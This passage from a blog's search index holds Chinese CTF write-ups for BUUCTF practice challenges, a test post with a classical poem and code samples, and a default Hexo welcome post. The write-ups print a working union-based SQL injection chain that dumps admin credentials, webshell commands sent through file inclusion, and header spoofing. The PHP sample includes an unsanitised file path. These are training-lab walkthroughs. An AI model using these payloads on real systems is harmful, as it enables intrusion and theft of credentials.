<code>测试新闻1</code> ，f12 查看状态，发现注入点，访问请求网址</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 正常回显<br><span class="hljs-attribute">1</span>=2 报错，说明有注入点<br></code></pre></td></tr></table></figure><p>构造 payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">2</span>#<br>得到数据库：information_schema,performance_schema,ctftraining,mysql,test,news<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;news&#x27;</span>),<span class="hljs-number">2</span>#<br>得到数据库 news 下的表：<span class="hljs-keyword">admin</span>,contents<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span>),<span class="hljs-number">2</span>#<br>得到数据库 ctftraining 下的表：FLAG_TABLE,news,users<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>),<span class="hljs-number">2</span>#<br>得到 <span class="hljs-keyword">admin</span> 表下的列名：id,username,<span class="hljs-keyword">password</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">2</span>#<br>得到 users 表下的列名：<span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,<span class="hljs-keyword">password</span>,ip,<span class="hljs-type">time</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(username,&quot; &quot;,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>),<span class="hljs-number">2</span>#<br>得到 <span class="hljs-keyword">admin</span> 的数据：username=<span class="hljs-keyword">admin</span> <span class="hljs-keyword">password</span>=<span class="hljs-number">64</span>ebd6a0d676acff2c6bed36e716c9aa<br></code></pre></td></tr></table></figure><h2 id="BUU-UPLOAD-COURSE-1"><a href="#BUU-UPLOAD-COURSE-1" class="headerlink" title="BUU UPLOAD COURSE 1"></a>BUU UPLOAD COURSE 1</h2><p>文件上传，先上传一个一句话木马 11.php ，但是蚁剑连接不了，无论上传什么都会被解析成 <code>.jpg</code> 格式</p><p>后面才知道这有一个文件包含漏洞，文件上传和文件包含结合起来了。</p><p><code>http://4eb012d0-f5b1-4297-907d-54f47dfaddf1.node5.buuoj.cn:81/index.php?file=upload.php</code> 将 <code>upload.php</code> 换成上传的文件的路径，然后对其 post 传参 </p><p>payload：1 是一句话木马的连接密码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;ls /&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h2><p>提示只能本地访问，所以bp 抓包进行 <code>X-Forwarded-For</code> 伪造</p><p>然后进行 post 传参</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=admin&amp;password=wwoj2wio2jw93ey43eiuwdjnewkndjlwe<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TestWP</title>
    <link href="/2024/11/06/TestWP/"/>
    <url>/2024/11/06/TestWP/</url>
    
    <content type="html"><![CDATA[<p>这是一篇测试文章</p><span id="more"></span><p><img src="/2024/11/06/TestWP/111.png"></p><h1 id="一剪梅·红藕香残玉簟秋"><a href="#一剪梅·红藕香残玉簟秋" class="headerlink" title="一剪梅·红藕香残玉簟秋"></a>一剪梅·红藕香残玉簟秋</h1><p>一剪梅·红藕香残玉簟秋</p><p>李清照</p><p>红藕香残玉簟秋。轻解罗裳，独上兰舟。云中谁寄锦书来？雁字回时，月满西楼。<br>花自飘零水自流。一种相思，两处闲愁。此情无计可消除，才下眉头，却上心头。</p><p>C&#x2F;C++</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;e3nifIH9b_C@n@dH&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)):<br>    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i])-i)<br><span class="hljs-built_in">print</span>(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><p>Java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Node java= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>        Node rw=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;rw&quot;</span>);<br>        Node urm=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;urm&quot;</span>);<br>        java.next=rw;<br>        rw.next=urm;<br>        <br>        urm.prev=rw;<br>        rw.prev=java;<br>        <br>        Node first=java;<br>        Node last=urm;<br>        <br>        Node temp=first;<br>        <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(temp);<br>            temp=temp.next;<br>        &#125;<br>        <br>        temp=last;<br>        <span class="hljs-keyword">while</span>(temp!=<span class="hljs-literal">null</span>)&#123;<br>            System.out.println(temp);<br>            temp=temp.prev;<br>        &#125;<br>        <br>    &#125;<br>    <br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span>&#123;<br>    <span class="hljs-keyword">public</span> Node prev;<br>    <span class="hljs-keyword">public</span> Node next;<br>    <span class="hljs-keyword">public</span> Object item;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Node</span><span class="hljs-params">(Object item)</span> &#123;<br>        <span class="hljs-built_in">this</span>.item = item;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Node&#123;&quot;</span> + <span class="hljs-string">&quot;item=&quot;</span> + item + <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>表格</p><table><thead><tr><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>4</td><td>5</td><td>6</td></tr><tr><td>7</td><td>8</td><td>9</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/11/06/hello-world/"/>
    <url>/2024/11/06/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
